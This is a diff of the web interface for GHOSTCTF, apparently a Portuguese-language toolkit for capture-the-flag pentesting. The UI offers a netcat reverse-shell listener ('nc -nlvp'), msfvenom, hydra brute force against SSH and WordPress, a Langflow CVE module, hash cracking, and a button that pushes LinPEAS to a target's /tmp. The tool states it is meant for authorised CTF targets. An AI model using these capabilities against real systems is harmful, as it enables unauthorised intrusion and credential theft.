-      <div id="ptyModuleCard" class="sidebar-payload-card" style="margin-top:10px;border:1px solid var(--border);padding:10px;background:var(--bg2)">
+      <div id="ptyModuleCard" class="sidebar-payload-card sidebar-module-off" style="margin-top:10px;border:1px solid var(--border);padding:10px;background:var(--bg2)">
         <div class="section-label section-label--with-help" style="margin-bottom:6px">
-          <button type="button" class="sidebar-module-toggle" id="ptyModuleToggle" onclick="toggleSidebarPayloadModule('pty')" aria-expanded="true" aria-controls="ptyModuleBody" title="Mostrar ou ocultar conteúdo">ON</button>
+          <button type="button" class="sidebar-module-toggle" id="ptyModuleToggle" onclick="toggleSidebarPayloadModule('pty')" aria-expanded="false" aria-controls="ptyModuleBody" title="Mostrar ou ocultar conteúdo">OFF</button>
           <span class="section-label-heading">Shell reversa — PTY</span>
           <button type="button" class="findings-help-btn" id="ptyHelpBtn" aria-label="Ajuda: shell reversa e PTY" title="Ajuda: shell reversa e PTY">?</button>
           <span class="section-label-rule" aria-hidden="true"></span>
@@ -1421,9 +2180,9 @@
         </div>
         </div>
       </div>
-      <div id="httpServeModuleCard" class="sidebar-payload-card" style="margin-top:10px;border:1px solid var(--border);padding:10px;background:var(--bg2)">
+      <div id="httpServeModuleCard" class="sidebar-payload-card sidebar-module-off" style="margin-top:10px;border:1px solid var(--border);padding:10px;background:var(--bg2)">
         <div class="section-label section-label--with-help" style="margin-top:0;margin-bottom:6px">
-          <button type="button" class="sidebar-module-toggle" id="httpServeModuleToggle" onclick="toggleSidebarPayloadModule('httpServe')" aria-expanded="true" aria-controls="httpServeModuleBody" title="Mostrar ou ocultar conteúdo">ON</button>
+          <button type="button" class="sidebar-module-toggle" id="httpServeModuleToggle" onclick="toggleSidebarPayloadModule('httpServe')" aria-expanded="false" aria-controls="httpServeModuleBody" title="Mostrar ou ocultar conteúdo">OFF</button>
           <span class="section-label-heading">Servidor HTTP<span class="section-label-subline">(máquina atacante)</span></span>
           <button type="button" class="findings-help-btn" id="httpServeHelpBtn" aria-label="Ajuda: servidor HTTP" title="Ajuda: servidor HTTP">?</button>
           <span class="section-label-rule" aria-hidden="true"></span>
@@ -1437,9 +2196,9 @@
         </div>
       </div>
 
-      <div id="msfvenomModuleCard" class="sidebar-payload-card" style="margin-top:10px;border:1px solid var(--border);padding:10px;background:var(--bg2)">
+      <div id="msfvenomModuleCard" class="sidebar-payload-card sidebar-module-off" style="margin-top:10px;border:1px solid var(--border);padding:10px;background:var(--bg2)">
         <div class="section-label section-label--with-help" style="margin-bottom:6px">
-          <button type="button" class="sidebar-module-toggle" id="msfvenomModuleToggle" onclick="toggleSidebarPayloadModule('msfvenom')" aria-expanded="true" aria-controls="msfvenomModuleBody" title="Mostrar ou ocultar conteúdo">ON</button>
+          <button type="button" class="sidebar-module-toggle" id="msfvenomModuleToggle" onclick="toggleSidebarPayloadModule('msfvenom')" aria-expanded="false" aria-controls="msfvenomModuleBody" title="Mostrar ou ocultar conteúdo">OFF</button>
           <span class="section-label-heading">Msfvenom<span class="section-label-subline">(manual — CLI)</span></span>
           <button type="button" class="findings-help-btn" id="msfvenomManualHelpBtn" aria-label="Ajuda: Msfvenom manual" title="Ajuda: Msfvenom manual">?</button>
           <span class="section-label-rule" aria-hidden="true"></span>
@@ -1468,9 +2227,9 @@
         </div>
       </div>
 
-      <div id="wandenreichModuleCard" class="sidebar-payload-card" style="margin-top:10px;border:1px solid var(--border);padding:10px;background:var(--bg2);box-shadow:0 0 0 1px rgba(180,120,255,0.12) inset">
+      <div id="wandenreichModuleCard" class="sidebar-payload-card sidebar-module-off" style="margin-top:10px;border:1px solid var(--border);padding:10px;background:var(--bg2);box-shadow:0 0 0 1px rgba(180,120,255,0.12) inset">
         <div class="section-label section-label--with-help" style="margin-bottom:6px">
-          <button type="button" class="sidebar-module-toggle" id="wandenreichModuleToggle" onclick="toggleSidebarPayloadModule('wandenreich')" aria-expanded="true" aria-controls="wandenreichModuleBody" title="Mostrar ou ocultar conteúdo">ON</button>
+          <button type="button" class="sidebar-module-toggle" id="wandenreichModuleToggle" onclick="toggleSidebarPayloadModule('wandenreich')" aria-expanded="false" aria-controls="wandenreichModuleBody" title="Mostrar ou ocultar conteúdo">OFF</button>
           <span class="section-label-heading">Wandenreich<span class="section-label-subline">(payloads automáticos)</span></span>
           <button type="button" class="findings-help-btn" id="wandenreichHelpBtn" aria-label="Ajuda: Wandenreich" title="Ajuda: Wandenreich">?</button>
           <span class="section-label-rule" aria-hidden="true"></span>
@@ -1511,7 +2270,7 @@
         </div>
         <p style="font-size:8px;color:var(--text-dim);margin:0 0 8px;line-height:1.4">API ngrok: <code style="color:var(--text-bright)">127.0.0.1:4040</code> · <code style="color:var(--text-bright)">GHOSTCTF_NGROK_API</code> · <code style="color:var(--text-bright)">ngrok tcp &lt;porta local&gt;</code></p>
         <label style="display:flex;align-items:center;gap:8px;font-size:9px;color:var(--text-dim);margin:0 0 8px;cursor:pointer">
-          <input type="checkbox" id="payloadOpenNcChk" checked style="accent-color:var(--accent)">
+          <input type="checkbox" id="payloadOpenNcChk" style="accent-color:var(--accent)">
           <span>Após gravar <strong>reverse</strong>, abrir mini-nc na <strong>porta local</strong></span>
         </label>
         <div style="display:flex;flex-wrap:wrap;gap:6px;align-items:center">
@@ -1562,6 +2321,17 @@
 
     <!-- Module Selection -->
     <div class="modules-section">
+      <div class="modules-section-flag-bar" style="margin-bottom:10px;display:flex;justify-content:flex-end">
+        <button
+          type="button"
+          class="export-btn"
+          id="indexFlagManualOpenBtn"
+          style="padding:5px 12px;font-size:9px;letter-spacing:1px"
+          title="Gravar flag na checklist SQLite, na lista de achados e opcionalmente no Cortex (mesmo fluxo do Reporte)"
+        >
+          Flag manual
+        </button>
+      </div>
       <div class="section-label section-label--with-help">
         <span class="section-label-heading">Modules</span>
         <button
@@ -1572,6 +2342,21 @@
           title="Ajuda: módulos e opções"
         >?</button>
         <span class="section-label-rule" aria-hidden="true"></span>
+      </div>
+
+      <div class="module-group" style="margin-bottom:12px">
+        <label
+          class="checkbox-item"
+          title="Ligado: marca todos os módulos abaixo (checkboxes Recon / probes). Desligado: desmarca todos. Não muda plataforma CTF nem Modo Kali."
+        >
+          <input type="checkbox" id="modulesFullToggle" aria-label="Preset Full — todos os módulos" />
+          <div class="checkbox-box"></div>
+          <span class="checkbox-text"><strong>Full</strong> — todos os módulos</span>
+          <span class="tag tag-med" id="modulesFullTag">OFF</span>
+        </label>
+        <p style="font-size:9px;color:var(--text-dim);margin:4px 0 0 28px;line-height:1.45">
+          No início da lista: um toque activa ou limpa <strong>todas</strong> as caixas <code style="color:var(--text-bright)">.mod</code> (inclui probes agressivos — só em alvos autorizados).
+        </p>
       </div>
 
       <div class="module-group">
@@ -1610,7 +2395,7 @@
         <label class="checkbox-item"><input type="checkbox" class="mod" value="credReuseProbe"><div class="checkbox-box"></div><span class="checkbox-text">Credential Reuse (FTP/HTTP basic)</span><span class="tag tag-med">OFF</span></label>
         <label class="checkbox-item"><input type="checkbox" class="mod" value="wpFocusProbe"><div class="checkbox-box"></div><span class="checkbox-text">WordPress Focus (wp-login/xmlrpc/wp-json/plugins)</span><span class="tag tag-med">OFF</span></label>
         <label class="checkbox-item"><input type="checkbox" class="mod" value="wpScanProbe"><div class="checkbox-box"></div><span class="checkbox-text">WPScan probe (heavy, optional)</span><span class="tag tag-med">OFF</span></label>
-        <label class="checkbox-item"><input type="checkbox" class="mod" value="etcHostsProbe" id="modEtcHostsProbe"><div class="checkbox-box"></div><span class="checkbox-text">Hostnames (/etc/hosts) — curl após recon no IP</span><span class="tag tag-med">OFF</span></label>
+        <label class="checkbox-item"><input type="checkbox" class="mod" value="etcHostsProbe" id="modEtcHostsProbe"><div class="checkbox-box"></div><span class="checkbox-text">Hostnames (/etc/hosts) — lê o ficheiro local + curl após recon no IP</span><span class="tag tag-med">OFF</span></label>
         <div class="module-group-title" style="margin-top:14px">// Extended (lacunas típicas CTF4/9/Langflow)</div>
         <label class="checkbox-item"><input type="checkbox" class="mod" value="tinyFmProbe"><div class="checkbox-box"></div><span class="checkbox-text">Tiny File Manager — credenciais CTF comuns (POST)</span><span class="tag tag-med">OFF</span></label>
         <label class="checkbox-item"><input type="checkbox" class="mod" value="activeMqProbe"><div class="checkbox-box"></div><span class="checkbox-text">ActiveMQ — GET :8161 + dicas túnel SSH / CVE</span><span class="tag tag-med">OFF</span></label>
@@ -1622,9 +2407,9 @@
         <input id="vhostBaseDomainInput" type="text" placeholder="Domínio apex (ex.: projects-blogo.sy)" style="width:100%;margin:4px 0 6px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:7px">
         <input id="vhostFuzzExtraPrefixesInput" type="text" placeholder="Prefixos extra opcionais: foo, bar, api2" style="width:100%;margin:0 0 10px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:7px">
         <div class="module-group-title" style="margin-top:12px;color:var(--accent-warn,#c98)">// Agressivo (só CTF / autorização explícita)</div>
-        <div id="sshBruteModuleCard" class="sidebar-payload-card" style="margin-top:10px;padding:10px;border:1px solid var(--border);background:var(--bg2);border-radius:2px">
+        <div id="sshBruteModuleCard" class="sidebar-payload-card sidebar-module-off" style="margin-top:10px;padding:10px;border:1px solid var(--border);background:var(--bg2);border-radius:2px">
           <div class="section-label section-label--with-help" style="margin-bottom:6px">
-            <button type="button" class="sidebar-module-toggle" id="sshBruteModuleToggle" onclick="toggleSidebarPayloadModule('sshBrute')" aria-expanded="true" aria-controls="sshBruteModuleBody" title="Mostrar ou ocultar conteúdo">ON</button>
+            <button type="button" class="sidebar-module-toggle" id="sshBruteModuleToggle" onclick="toggleSidebarPayloadModule('sshBrute')" aria-expanded="false" aria-controls="sshBruteModuleBody" title="Mostrar ou ocultar conteúdo">OFF</button>
             <span class="section-label-heading">SSH brute<span class="section-label-subline">(hydra)</span></span>
             <span class="section-label-rule" aria-hidden="true"></span>
           </div>
@@ -1646,9 +2431,9 @@
         </div>
           </div>
         </div>
-        <div id="wpBruteHydraModuleCard" class="sidebar-payload-card" style="margin-top:10px;padding:10px;border:1px solid var(--border);background:var(--bg2);border-radius:2px">
+        <div id="wpBruteHydraModuleCard" class="sidebar-payload-card sidebar-module-off" style="margin-top:10px;padding:10px;border:1px solid var(--border);background:var(--bg2);border-radius:2px">
           <div class="section-label section-label--with-help" style="margin-bottom:6px">
-            <button type="button" class="sidebar-module-toggle" id="wpBruteHydraModuleToggle" onclick="toggleSidebarPayloadModule('wpBruteHydra')" aria-expanded="true" aria-controls="wpBruteHydraModuleBody" title="Mostrar ou ocultar conteúdo">ON</button>
+            <button type="button" class="sidebar-module-toggle" id="wpBruteHydraModuleToggle" onclick="toggleSidebarPayloadModule('wpBruteHydra')" aria-expanded="false" aria-controls="wpBruteHydraModuleBody" title="Mostrar ou ocultar conteúdo">OFF</button>
             <span class="section-label-heading">WP brute<span class="section-label-subline">(hydra)</span></span>
             <span class="section-label-rule" aria-hidden="true"></span>
           </div>
@@ -1659,9 +2444,9 @@
         <input id="hydraWpBruteMaxPwInput" type="number" min="20" max="500" value="150" style="width:100%;margin:0 0 10px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:7px" title="Máx. linhas da wordlist a usar">
           </div>
         </div>
-        <div id="langflowCveModuleCard" class="sidebar-payload-card" style="margin-top:10px;padding:10px;border:1px solid var(--border);background:var(--bg2);border-radius:2px">
+        <div id="langflowCveModuleCard" class="sidebar-payload-card sidebar-module-off" style="margin-top:10px;padding:10px;border:1px solid var(--border);background:var(--bg2);border-radius:2px">
           <div class="section-label section-label--with-help" style="margin-bottom:6px">
-            <button type="button" class="sidebar-module-toggle" id="langflowCveModuleToggle" onclick="toggleSidebarPayloadModule('langflowCve')" aria-expanded="true" aria-controls="langflowCveModuleBody" title="Mostrar ou ocultar conteúdo">ON</button>
+            <button type="button" class="sidebar-module-toggle" id="langflowCveModuleToggle" onclick="toggleSidebarPayloadModule('langflowCve')" aria-expanded="false" aria-controls="langflowCveModuleBody" title="Mostrar ou ocultar conteúdo">OFF</button>
             <span class="section-label-heading">Langflow CVE<span class="section-label-subline">(2025-3248 + vértices)</span></span>
             <span class="section-label-rule" aria-hidden="true"></span>
           </div>
@@ -1678,7 +2463,7 @@
         </div>
         <div id="extraHostsWrap" style="display:none;margin:6px 0 14px;padding:10px 12px;border:1px solid var(--border);background:var(--bg2)">
           <div style="font-size:9px;color:var(--text-dim);line-height:1.5;margin-bottom:8px">
-            Configura antes no teu sistema <code style="color:var(--text-bright)">/etc/hosts</code> o mesmo IP do alvo (ex.: <code style="color:var(--text-bright)">3.4.5.6 challenge.ctf</code>). Aqui cola os <strong>mesmos</strong> hostnames — um por linha ou separados por vírgula. O Node corre no teu PC: o DNS/hosts local tem de resolver estes nomes para o IP.
+            Com o IP do alvo no RUN, o servidor <strong>lê automaticamente</strong> o <code style="color:var(--text-bright)">/etc/hosts</code> desta máquina (onde corre o Node) e junta ao recon todos os nomes cuja linha começa por esse IP. Opcional: cola aqui mais hostnames (um por linha ou vírgulas). Desliga a leitura automática com <code style="color:var(--text-bright)">GHOSTCTF_SKIP_LOCAL_ETC_HOSTS=1</code> no ambiente do servidor.
           </div>
           <textarea id="extraHostsInput" placeholder="challenge.ctf&#10;app.target.local" autocomplete="off" spellcheck="false" style="width:100%;min-height:76px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:8px;resize:vertical"></textarea>
           <label style="display:flex;gap:10px;align-items:flex-start;margin-top:10px;font-size:9px;color:var(--text-dim);line-height:1.45;cursor:pointer;user-select:none">
@@ -1689,9 +2474,9 @@
       </div>
 
       <div class="module-group">
-        <div id="crackModeModuleCard" class="sidebar-payload-card" style="padding:10px;border:1px solid var(--border);background:var(--bg2);border-radius:2px">
+        <div id="crackModeModuleCard" class="sidebar-payload-card sidebar-module-off" style="padding:10px;border:1px solid var(--border);background:var(--bg2);border-radius:2px">
           <div class="section-label section-label--with-help" style="margin-bottom:6px">
-            <button type="button" class="sidebar-module-toggle" id="crackModeModuleToggle" onclick="toggleSidebarPayloadModule('crackMode')" aria-expanded="true" aria-controls="crackModeModuleBody" title="Mostrar ou ocultar conteúdo">ON</button>
+            <button type="button" class="sidebar-module-toggle" id="crackModeModuleToggle" onclick="toggleSidebarPayloadModule('crackMode')" aria-expanded="false" aria-controls="crackModeModuleBody" title="Mostrar ou ocultar conteúdo">OFF</button>
             <span class="section-label-heading">Crack Mode</span>
             <span class="section-label-rule" aria-hidden="true"></span>
           </div>
@@ -1718,7 +2503,7 @@
           </select>
           <input id="johnWordlistInput" type="text" placeholder="Wordlist opcional (ex.: /usr/share/wordlists/rockyou.txt)" style="width:100%;margin-top:8px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:7px">
           <div style="display:flex;gap:10px;align-items:center;margin-top:8px;font-family:var(--mono);font-size:9px;color:var(--text-dim)">
-            <label style="display:flex;gap:6px;align-items:center"><input type="checkbox" id="johnRulesChk" checked> rules</label>
+            <label style="display:flex;gap:6px;align-items:center"><input type="checkbox" id="johnRulesChk"> rules</label>
             <label style="display:flex;gap:6px;align-items:center"><input type="checkbox" id="johnIncrementalChk"> incremental</label>
             <select id="johnIncrementalMode" style="background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:9px;padding:4px">
               <option value="Digits" selected>Digits</option>
@@ -1728,7 +2513,7 @@
           </div>
           <div style="display:flex;gap:8px;margin-top:8px">
             <button class="export-btn" onclick="runJohnCrackMode()">⚔ John crack</button>
-            <button class="export-btn" onclick="document.getElementById('johnHashInput').value='';document.getElementById('johnFormatSelect').value='raw-sha256';document.getElementById('johnWordlistInput').value='';document.getElementById('johnRulesChk').checked=true;document.getElementById('johnIncrementalChk').checked=false;document.getElementById('johnIncrementalMode').value='Digits';">Limpar</button>
+            <button class="export-btn" onclick="document.getElementById('johnHashInput').value='';document.getElementById('johnFormatSelect').value='raw-sha256';document.getElementById('johnWordlistInput').value='';document.getElementById('johnRulesChk').checked=false;document.getElementById('johnIncrementalChk').checked=false;document.getElementById('johnIncrementalMode').value='Digits';">Limpar</button>
           </div>
         </div>
           </div>
@@ -1802,26 +2587,27 @@
           <span style="color:var(--accent4)">●</span>
           <span style="color:var(--accent2)">●</span>
           <span style="margin-left:8px">GHOSTCTF // CTF PIPELINE LOG</span>
-          <button type="button" class="shell-mini-toggle" id="shellMiniToggleBtn" onclick="shellToggleMini()" title="Mostra ou esconde o nc + injeção de comandos">Mini-terminal nc ▾</button>
+          <button type="button" class="shell-mini-toggle" id="shellMiniToggleBtn" onclick="shellToggleMini()" title="Mostra ou esconde o nc + injeção de comandos" aria-label="Alternar mini-terminal netcat e injeção de comandos">Mini-terminal nc ▾</button>
         </div>
 
         <div id="shellMiniPanel" class="shell-mini-panel" style="display:none">
           <div style="font-size:9px;color:var(--text-dim);line-height:1.5">
             <span style="color:var(--accent2)">①</span> <strong>Iniciar nc</strong> — o Node corre <code style="color:var(--text-bright)">nc -nlvp PORTA</code> no teu PC.
             <span style="color:var(--accent2)">②</span> No alvo, reverse shell para <strong>teu IP:porta</strong>.
-            <span style="color:var(--accent2)">③</span> Saída na caixa; <strong>Injetar</strong> = campo em baixo (Enter) ou botões <code>ls</code>/<code>grep</code>.
+            <span style="color:var(--accent2)">③</span> Saída na caixa; <strong>Injetar</strong> = campo em baixo (Enter) ou botões <code>ls</code>/<code>grep</code>/<strong>LinPEAS</strong> (só descarga para <code>/tmp</code>, não corre o script).
             <span style="display:block;margin-top:6px;font-size:8px;color:var(--accent3)">Ngrok TCP: <code>ngrok tcp PORTA</code> · UI remota: <code>GHOSTCTF_SHELL_WS_ANY=1</code></span>
           </div>
           <div style="display:flex;flex-wrap:wrap;gap:8px;align-items:center;font-family:var(--mono);font-size:10px">
             <label style="color:var(--text-dim)">Porta <input id="shellBridgePort" type="text" inputmode="numeric" value="4444" style="width:56px;background:var(--bg);border:1px solid var(--border);color:var(--text);font-family:var(--mono);font-size:10px;padding:5px 6px"></label>
-            <button type="button" class="export-btn" id="shellBridgeBtnStart" onclick="shellBridgeStart()">Iniciar nc</button>
-            <button type="button" class="export-btn" id="shellBridgeBtnStop" onclick="shellBridgeStop()" disabled>Parar</button>
-            <button type="button" class="export-btn" onclick="shellBridgeSendPreset('ls -la')" title="Injeta na shell">ls -la</button>
-            <button type="button" class="export-btn" onclick="shellBridgeSendGrepFlag()" title="Injeta na shell">grep Solyd{</button>
+            <button type="button" class="export-btn" id="shellBridgeBtnStart" onclick="shellBridgeStart()" aria-label="Iniciar netcat em escuta na porta indicada">Iniciar nc</button>
+            <button type="button" class="export-btn" id="shellBridgeBtnStop" onclick="shellBridgeStop()" disabled aria-label="Parar netcat">Parar</button>
+            <button type="button" class="export-btn" onclick="shellBridgeSendPreset('ls -la')" title="Injeta na shell" aria-label="Injetar comando ls -la na shell">ls -la</button>
+            <button type="button" class="export-btn" onclick="shellBridgeSendGrepFlag()" title="Injeta na shell: grep Solyd{ em cada home de /etc/passwd + . (cwd)" aria-label="Injetar grep por flags Solyd na shell">grep Solyd{</button>
+            <button type="button" class="export-btn" onclick="shellBridgeSendLinpeasCopy()" title="Injeta na shell: descarrega LinPEAS (PEASS-ng) para /tmp/linpeas.sh — não executa; corre manualmente se quiseres" aria-label="Descarregar LinPEAS para tmp no alvo">LinPEAS → /tmp</button>
           </div>
           <div style="display:flex;flex-wrap:wrap;gap:8px;align-items:center;margin-top:4px">
-            <button type="button" class="export-btn" id="shellBridgeBtnAuto" onclick="shellBridgeAutoExplore()" title="Primeiro: script + TERM + pty; depois enum (ls, flags, passwd…). Liga a shell antes.">Enum CTF automático</button>
-            <button type="button" class="export-btn" id="shellBridgeBtnAutoAbort" onclick="shellBridgeAutoExploreAbort()" disabled>Parar enum auto</button>
+            <button type="button" class="export-btn" id="shellBridgeBtnAuto" onclick="shellBridgeAutoExplore()" title="Primeiro: script + TERM + pty; depois enum (ls, flags, passwd…). Liga a shell antes." aria-label="Enumeração CTF automática na shell ligada">Enum CTF automático</button>
+            <button type="button" class="export-btn" id="shellBridgeBtnAutoAbort" onclick="shellBridgeAutoExploreAbort()" disabled aria-label="Parar enumeração automática">Parar enum auto</button>
           </div>
           <div id="shellBridgeStatus" style="font-size:9px;color:var(--text-dim);min-height:14px"></div>
           <pre class="shell-bridge-out-wrap" id="shellBridgeOut" aria-label="Saída nc / shell remota"></pre>
@@ -1830,7 +2616,7 @@
           </div>
         </div>
 
-        <div class="terminal-scroll" id="termScroll">
+        <div class="terminal-scroll" id="termScroll" role="log" aria-live="polite" aria-relevant="additions" aria-label="Log do pipeline GHOSTCTF">
         <div id="termContent">
           <div class="empty-state">
             <pre class="empty-ascii">
@@ -1848,6 +2634,27 @@
 ╚██████╗   ██║   ██║                       
  ╚═════╝   ╚═╝   ╚═╝                       
 </pre>
+            <div class="empty-ghost-wrap" aria-hidden="true" title="Fastaminha">
+              <svg viewBox="0 0 48 52" xmlns="http://www.w3.org/2000/svg" width="88" height="96" focusable="false" aria-hidden="true">
+                <g class="empty-gh-anim">
+                  <path
+                    fill="currentColor"
+                    fill-opacity="0.92"
+                    stroke="currentColor"
+                    stroke-opacity="0.42"
+                    stroke-width="0.55"
+                    d="M 24 5 C 13 5 5 13.5 5 24.5 V 40 Q 8.5 36.5 12 40 Q 15.5 36.5 19 40 Q 22.5 36.5 26 40 Q 29.5 36.5 33 40 Q 36.5 36.5 40 40 Q 43.5 36.5 43 40 V 24.5 C 43 13.5 35 5 24 5 Z"
+                  />
+                  <path
+                    fill="#ffffff"
+                    fill-opacity="0.14"
+                    d="M 24 8 C 15 8 9 15 9 23.5 V 33 Q 16 28 24 32 Q 32 28 39 33 V 23.5 C 39 15 33 8 24 8 Z"
+                  />
+                  <ellipse class="empty-gh-eye" cx="17" cy="22" rx="3.2" ry="4.2" fill="#050508" />
+                  <ellipse class="empty-gh-eye empty-gh-eye-r" cx="31" cy="22" rx="3.2" ry="4.2" fill="#050508" />
+                </g>
+              </svg>
+            </div>
             <div class="empty-msg">AGUARDANDO IP // INSERT IP TO BEGIN</div>
           </div>
         </div>
@@ -2008,7 +2815,7 @@
         <li><strong>Credential Reuse</strong> — reaproveita credenciais encontradas em <strong>FTP</strong> e <strong>HTTP Basic</strong> (requer Disclosure ligado para alimentar creds).</li>
         <li><strong>WordPress Focus</strong> — <code>wp-login</code>, xmlrpc, <code>wp-json</code>, plugins, enum de users.</li>
         <li><strong>WPScan</strong> — ferramenta externa pesada; JSON para findings (opcional).</li>
-        <li><strong>Hostnames (/etc/hosts)</strong> — após recon no IP, repete lógica web com nomes que colas (o teu SO tem de resolver esses nomes para o IP do alvo). Opção <strong>só hostnames</strong> evita curl inicial em <code>http(s)://IP</code>.</li>
+        <li><strong>Hostnames (/etc/hosts)</strong> — com o módulo ligado, o servidor lê o <code>/etc/hosts</code> da máquina onde corre o Node e junta automaticamente os nomes cuja linha tem o mesmo IP do alvo; podes acrescentar nomes na caixa de texto. Opção <strong>só hostnames</strong> evita curl inicial em <code>http(s)://IP</code>.</li>
       </ul>
 
       <h3>Extended (lacunas típicas)</h3>
@@ -2046,6 +2853,60 @@
         <strong>John Crack</strong> — cola o hash, escolhe <strong>formato</strong> (<code>raw-md5</code>, <code>bcrypt</code>, …), wordlist opcional.
         <strong>rules</strong> aplica regras do John; <strong>incremental</strong> gera candidatos por modo (Digits/Alnum/ASCII) quando não há wordlist ou como complemento.
       </p>
+    </div>
+  </div>
+</div>
+
+<!-- Flag manual (checklist + SQLite, consola principal) -->
+<div class="help-modal-overlay" id="indexFlagManualOverlay" aria-hidden="true">
+  <div class="help-modal help-modal-wide" role="dialog" aria-modal="true" aria-labelledby="indexFlagManualTitle" tabindex="-1">
+    <button type="button" class="help-modal-close" id="indexFlagManualClose" aria-label="Fechar">×</button>
+    <h2 id="indexFlagManualTitle">Flag manual</h2>
+    <div class="help-modal-body">
+      <p style="margin:0 0 12px;font-size:12px;color:var(--text-dim);line-height:1.5">
+        Para flags <strong>fora do recon</strong>: mesmo achado <code style="color:var(--text-bright)">type: flag</code>, gravação na base e na lista à direita; opcional ligação ao Cortex.
+      </p>
+      <div class="index-flag-manual-field">
+        <label for="indexFlagManualTarget">Alvo (domínio ou IP)</label>
+        <input type="text" id="indexFlagManualTarget" maxlength="200" placeholder="ex.: alvo.ctf ou 10.0.0.5" autocomplete="off" spellcheck="false" />
+      </div>
+      <div class="index-flag-manual-field">
+        <label for="indexFlagManualValue">Flag (texto completo)</label>
+        <textarea id="indexFlagManualValue" maxlength="500" rows="2" placeholder="Solyd{…} ou formato da plataforma" spellcheck="false"></textarea>
+      </div>
+      <div class="index-flag-manual-field">
+        <label for="indexFlagManualUrl">URL (opcional)</label>
+        <input type="text" id="indexFlagManualUrl" maxlength="2000" placeholder="https://… (vazio → https://alvo/)" autocomplete="off" spellcheck="false" />
+      </div>
+      <div class="index-flag-manual-field">
+        <label for="indexFlagManualMeta">Meta / contexto curto (opcional)</label>
+        <input type="text" id="indexFlagManualMeta" maxlength="800" placeholder="ex.: Discord, write-up, etc." autocomplete="off" />
+      </div>
+      <div class="index-flag-manual-field">
+        <label for="indexFlagManualDesafio">Desafio / projecto (opcional)</label>
+        <input type="text" id="indexFlagManualDesafio" maxlength="120" placeholder="Ou deixa vazio e usa o nome do histórico Ghost" autocomplete="off" />
+      </div>
+      <div class="index-flag-manual-field">
+        <label for="indexFlagManualPrio">Prioridade</label>
+        <select id="indexFlagManualPrio">
+          <option value="high">high</option>
+          <option value="med">medium</option>
+          <option value="low">low</option>
+        </select>
+      </div>
+      <div class="index-flag-manual-field">
+        <label for="indexFlagManualCategory">Categoria no Cortex</label>
+        <select id="indexFlagManualCategory">
+          <option value="">— Só checklist (ligar ao cérebro depois) —</option>
+        </select>
+      </div>
+      <div class="index-flag-manual-field">
+        <label for="indexFlagManualNotes">Notas (checklist)</label>
+        <textarea id="indexFlagManualNotes" maxlength="2000" rows="2" placeholder="Como obtiveste a flag…" spellcheck="false"></textarea>
+      </div>
+      <div class="index-flag-manual-actions">
+        <button type="button" class="export-btn" id="indexFlagManualSubmit">Adicionar à checklist e gravar</button>
+      </div>
     </div>
   </div>
 </div>
@@ -2238,7 +3099,7 @@
     <h2 id="httpServeHelpTitle">Servidor HTTP (máquina atacante)</h2>
     <div class="help-modal-body">
       <p>
-        Serve ficheiros da <strong>tua</strong> máquina (Kali/host) para o <strong>alvo</strong> descarregar com <code>wget</code> ou <code>curl</code> — típico em CTF para passar exploits, <code>linpeas</code>, chaves ou scripts quando já tens execução de comandos no servidor.
+        Serve ficheiros da <strong>tua</strong> máquina (Kali/host) para o <strong>alvo</strong> descarregar com <code>wget</code> ou <code>curl</code> — típico em CTF para passar exploits, chaves ou scripts quando já tens execução de comandos no servidor. No mini-terminal, o botão <strong>LinPEAS → /tmp</strong> pede ao alvo para descarregar o <code>linpeas.sh</code> oficial (PEASS-ng) para <code>/tmp</code> <em>sem executar</em>.
       </p>
       <p>
         Define a <strong>porta</strong> (ex.: <code>8000</code>) e carrega em <strong>Copiar python3 -m http.server</strong>. No diretório onde estão os ficheiros que queres expor, corre o comando no teu terminal.
@@ -2262,6 +3123,7 @@ let currentFilter = 'all';
 let isRunning = false;
 let stats = { endpoints: 0, params: 0, flags: 0, secrets: 0, high: 0 };
 let targetDomain = '';
+const MITRE_LIVE_SESSION_STORAGE_KEY = 'ghostctf_mitre_live_session_id';
 
 /**
  * Com a página em http://127.0.0.1:PORT (npm start), usa URLs relativas.
@@ -2285,6 +3147,548 @@ function apiUrl(path) {
   const base = getApiBase();
   const p = path.startsWith('/') ? path : `/${path}`;
   return base ? `${base}${p}` : p;
+}
+
+// ─── Ghostmap (MITRE ao vivo) + Cortex + Reporte ──────────
+function mitreLivePost(msg) {
+  try {
+    if (window.__mitreLiveBc) window.__mitreLiveBc.postMessage(msg);
+  } catch (_) {}
+}
+
+function mitreLiveCurrentKaliMode() {
+  return Boolean(document.getElementById('kaliModeToggle')?.checked && window.__kaliScanAvailable);
+}
+
+function mitreLivePostPipelineInputPhase() {
+  const km = mitreLiveCurrentKaliMode();
+  const t = targetDomain || '';
+  mitreLivePost({ type: 'pipe', name: 'input', state: 'active', target: t, kaliMode: km });
+  mitreLivePost({ type: 'pipe', name: 'input', state: 'done', target: t, kaliMode: km });
+}
+
+function closeMitreLiveQuiet() {
+  try {
+    window.__mitreLiveBc?.close();
+  } catch (_) {}
+  window.__mitreLiveBc = null;
+  window.__mitreLiveSessionId = null;
+  const btn = document.getElementById('mitreMapBtn');
+  if (btn) btn.classList.remove('mitre-map-btn--ready');
+}
+
+function closeMitreLive() {
+  mitreLivePost({ type: 'run_end' });
+  closeMitreLiveQuiet();
+  initMitreLiveSession({ forceNewSession: true });
+}
+
+function ensureGhostmapLiveChannel() {
+  if (typeof BroadcastChannel === 'undefined') return false;
+  if (window.__mitreLiveBc) return true;
+  let id = window.__mitreLiveSessionId;
+  if (!id) {
+    try {
+      id = localStorage.getItem(MITRE_LIVE_SESSION_STORAGE_KEY) || '';
+    } catch (_) {}
+  }
+  if (!id) {
+    id = crypto.randomUUID();
+    try {
+      localStorage.setItem(MITRE_LIVE_SESSION_STORAGE_KEY, id);
+    } catch (_) {}
+  }
+  window.__mitreLiveSessionId = id;
+  try {
+    window.__mitreLiveBc = new BroadcastChannel('ghostctf-mitre-' + id);
+  } catch (_) {
+    return false;
+  }
+  const btn = document.getElementById('mitreMapBtn');
+  if (btn) {
+    btn.disabled = false;
+    btn.classList.add('mitre-map-btn--ready');
+    btn.title =
